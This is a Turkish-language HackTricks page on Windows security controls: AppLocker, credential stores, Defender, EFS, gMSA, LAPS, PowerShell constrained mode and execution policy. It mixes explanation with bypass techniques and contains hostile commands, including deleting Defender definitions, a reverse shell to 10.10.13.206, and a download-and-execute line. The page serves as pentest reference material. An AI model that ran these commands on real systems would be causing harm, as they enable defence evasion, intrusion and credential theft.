# Windows Güvenlik Kontrolleri

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Politikası

Bir uygulama beyaz listesi, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamaları veya çalıştırılabilir dosyaların bir listesidir. Amaç, ortamı zararlı kötü amaçlı yazılımlardan ve bir organizasyonun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft'un **uygulama beyaz listeleme çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği üzerinde kontrol** sağlar. **Çalıştırılabilir dosyalar, betikler, Windows yükleyici dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri** üzerinde **ince ayar kontrolü** sağlar.\
Organizasyonların **cmd.exe ve PowerShell.exe'yi** engellemesi ve belirli dizinlere yazma erişimi kısıtlaması yaygındır, **ancak bunların hepsi atlatılabilir**.

### Kontrol

Hangi dosyaların/uzantıların kara listeye alındığını/beyaz listeye alındığını kontrol edin:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir ve sistemdeki mevcut kural setini gözden geçirme imkanı sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Politikasını atlamak için **Yazılabilir klasörler**: Eğer AppLocker `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyi çalıştırmaya izin veriyorsa, bunu **atlamak** için kullanabileceğiniz **yazılabilir klasörler** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyaları, AppLocker'ı atlatmak için de yararlı olabilir.
- **Kötü yazılmış kurallar da atlatılabilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, istediğiniz herhangi bir yere **`allowed`** adında bir **klasör oluşturursanız** bu izin verilecektir.
- Kuruluşlar genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** yürütülebilir dosyasını **engellemeye** odaklanır, ancak **diğer** [**PowerShell yürütülebilir konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) unutur, örneğin `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe`.
- **DLL uygulaması çok nadiren etkinleştirilir** çünkü sistem üzerinde ek bir yük oluşturabilir ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı yüksektir. Bu nedenle, **DLL'leri arka kapı olarak kullanmak AppLocker'ı atlatmaya yardımcı olacaktır**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak **Powershell** kodunu herhangi bir süreçte çalıştırabilir ve AppLocker'ı atlatabilirsiniz. Daha fazla bilgi için kontrol edin: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Kimlik Bilgileri Depolama

### Güvenlik Hesapları Yöneticisi (SAM)

Yerel kimlik bilgileri bu dosyada mevcuttur, şifreler hashlenmiştir.

### Yerel Güvenlik Otoritesi (LSA) - LSASS

**Kimlik bilgileri** (hashlenmiş) bu alt sistemin **belleğinde** **kaydedilir**.\
**LSA**, yerel **güvenlik politikasını** (şifre politikası, kullanıcı izinleri...), **kimlik doğrulama**, **erişim belirteçleri**... yönetir.\
LSA, sağlanan kimlik bilgilerini **SAM** dosyasında (yerel giriş için) **kontrol eden** ve bir alan kullanıcısını kimlik doğrulamak için **alan denetleyicisi** ile **konuşan** olacaktır.

**Kimlik bilgileri**, **işlem LSASS** içinde **kaydedilir**: Kerberos biletleri, NT ve LM hashleri, kolayca çözülebilen şifreler.

### LSA gizli bilgileri

LSA, diske bazı kimlik bilgilerini kaydedebilir:

- Aktif Dizin'in bilgisayar hesabının şifresi (ulaşılamayan alan denetleyicisi).
- Windows hizmetlerinin hesaplarının şifreleri
- Zamanlanmış görevler için şifreler
- Daha fazlası (IIS uygulamalarının şifresi...)

### NTDS.dit

Bu, Aktif Dizin'in veritabanıdır. Sadece Alan Denetleyicileri'nde mevcuttur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde mevcut olan bir antivirüstür. **Yaygın** pentesting araçlarını **engeller**, örneğin **`WinPEAS`**. Ancak, bu korumaları **atlatmanın yolları** vardır.

### Kontrol

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet **`Get-MpComputerStatus`** komutunu çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerine bakın):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu listelemek için ayrıca şunu çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifreli Dosya Sistemi (EFS)

EFS, dosyaları **simetrik anahtar** olan **Dosya Şifreleme Anahtarı (FEK)** ile şifreleyerek güvence altına alır. Bu anahtar, kullanıcının **açık anahtarı** ile şifrelenir ve şifrelenmiş dosyanın $EFS **alternatif veri akışında** saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasının ilgili **özel anahtarı** $EFS akışından FEK'yi çözmek için kullanılır. Daha fazla ayrıntı [burada](https://en.wikipedia.org/wiki/Encrypting_File_System) bulunabilir.

**Kullanıcı başlatması olmadan şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler, [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi bir EFS dosya sistemine taşındığında, otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden ağda gönderilen şifreli dosyalar, iletimden önce şifreleri çözülür.

Bu şifreleme yöntemi, sahibi için şifreli dosyalara **şeffaf erişim** sağlar. Ancak, sadece sahibin şifresini değiştirmek ve oturum açmak şifre çözmeye izin vermez.

**Ana Noktalar**:

- EFS, kullanıcının açık anahtarı ile şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme, FEK'ye erişmek için kullanıcının özel anahtarını kullanır.
- Belirli koşullar altında otomatik şifre çözme gerçekleşir, örneğin FAT32'ye kopyalama veya ağ iletimi gibi.
- Şifreli dosyalar, ek adımlar olmadan sahibine erişilebilir.

### EFS bilgilerini kontrol et

Bir **kullanıcının** bu **hizmeti** kullanıp kullanmadığını kontrol etmek için bu yolun var olup olmadığını kontrol edin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimlerin** **erişimi** olduğunu kontrol etmek için cipher /c \<file>\
Ayrıca bir klasör içinde `cipher /e` ve `cipher /d` komutlarını kullanarak tüm dosyaları **şifreleyebilir** ve **şifre çözebilirsiniz**.

### EFS dosyalarını şifre çözme

#### Yetki Sistemi Olmak

Bu yöntem, **kurban kullanıcının** ana bilgisayar içinde bir **işlem** çalıştırmasını gerektirir. Eğer durum buysa, `meterpreter` oturumları kullanarak kullanıcının işleminin token'ını taklit edebilirsiniz (`incognito`'dan `impersonate_token`). Ya da sadece kullanıcının işlemine `migrate` yapabilirsiniz.

#### Kullanıcının şifresini bilmek

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Grup Yönetilen Hizmet Hesapları (gMSA)

Microsoft, IT altyapılarındaki hizmet hesaplarının yönetimini basitleştirmek için **Grup Yönetilen Hizmet Hesapları (gMSA)** geliştirmiştir. Geleneksel hizmet hesaplarının genellikle "**Şifre asla süresi dolmaz**" ayarı etkinken, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Şifre Yönetimi**: gMSA'lar, alan veya bilgisayar politikasına göre otomatik olarak değişen karmaşık, 240 karakterli bir şifre kullanır. Bu süreç, Microsoft'un Anahtar Dağıtım Servisi (KDC) tarafından yönetilir ve manuel şifre güncellemeleri gereksiz hale gelir.
- **Geliştirilmiş Güvenlik**: Bu hesaplar kilitlenmelere karşı bağışık olup, etkileşimli oturum açmak için kullanılamaz, böylece güvenliklerini artırır.
- **Birden Fazla Ana Bilgisayar Desteği**: gMSA'lar, birden fazla ana bilgisayar arasında paylaşılabilir, bu da onları birden fazla sunucuda çalışan hizmetler için ideal hale getirir.
- **Zamanlanmış Görev Yeteneği**: Yönetilen hizmet hesaplarının aksine, gMSA'lar zamanlanmış görevlerin çalıştırılmasını destekler.
- **Basitleştirilmiş SPN Yönetimi**: Sistem, bilgisayarın sAMaccount ayrıntıları veya DNS adı değiştiğinde Hizmet Prensip Adını (SPN) otomatik olarak güncelleyerek SPN yönetimini basitleştirir.

gMSA'ların şifreleri, LDAP özelliği _**msDS-ManagedPassword**_ içinde saklanır ve Alan Denetleyicileri (DC'ler) tarafından her 30 günde bir otomatik olarak sıfırlanır. Bu şifre, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifrelenmiş bir veri bloğudur ve yalnızca yetkili yöneticiler ve gMSA'ların kurulu olduğu sunucular tarafından alınabilir, böylece güvenli bir ortam sağlanır. Bu bilgilere erişmek için, LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantı 'Sealing & Secure' ile kimlik doğrulaması yapılmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Bu şifreyi [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** ile okuyabilirsiniz:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu yazıda daha fazla bilgi bulun**](https://cube0x0.github.io/Relaying-for-gMSA/)

Ayrıca, **gMSA**'nın **şifresini** **okumak** için nasıl bir **NTLM relay attack** gerçekleştireceğinizi anlatan bu [web sayfasını](https://cube0x0.github.io/Relaying-for-gMSA/) kontrol edin.

## LAPS

**Local Administrator Password Solution (LAPS)**, [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilir, yerel Yönetici şifrelerinin yönetimini sağlar. Bu şifreler, **rastgele**, benzersiz ve **düzenli olarak değiştirilen** şifrelerdir ve merkezi olarak Active Directory'de saklanır. Bu şifrelere erişim, yetkili kullanıcılara ACL'ler aracılığıyla kısıtlanmıştır. Yeterli izinler verildiğinde, yerel yönetici şifrelerini okuma yeteneği sağlanır.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **PowerShell'i etkili bir şekilde kullanmak için gereken birçok özelliği** kısıtlar, örneğin COM nesnelerini engelleme, yalnızca onaylı .NET türlerine, XAML tabanlı iş akışlarına, PowerShell sınıflarına ve daha fazlasına izin verme gibi.

### **Kontrol Et**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Atlatma
```powershell
#Easy bypass
Powershell -version 2
```
Mevcut Windows'ta bu Bypass çalışmayacak ama [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Bunu derlemek için** **şunları yapmanız gerekebilir** **:** _**Bir Referans Ekle**_ -> _Gözat_ -> _Gözat_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ekleyin ve **projeyi .Net4.5'e değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Ters kabuk:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak **Powershell** kodunu herhangi bir süreçte çalıştırabilir ve kısıtlı modu atlayabilirsiniz. Daha fazla bilgi için kontrol edin: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS İcra Politikası

Varsayılan olarak **kısıtlı** olarak ayarlanmıştır. Bu politikayı atlamanın ana yolları:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [buradan](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) bulabilirsiniz.

## Güvenlik Destek Sağlayıcı Arayüzü (SSPI)

Kullanıcıları kimlik doğrulamak için kullanılabilecek API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumlu olacaktır. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere edecektir; bu kimlik doğrulama protokolleri Güvenlik Destek Sağlayıcı (SSP) olarak adlandırılır ve her Windows makinesinde DLL biçiminde bulunur ve her iki makinenin de iletişim kurabilmesi için aynı protokolü desteklemesi gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleri
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP, MD5 hash biçiminde şifre
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM, varsayılan olan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birkaç yöntem veya yalnızca bir tane sunabilir.

## UAC - Kullanıcı Hesabı Kontrolü

[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir.

{{#ref}}
uac-user-account-control.md
{{#endref}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

---

{{#include ../../banners/hacktricks-training.md}}
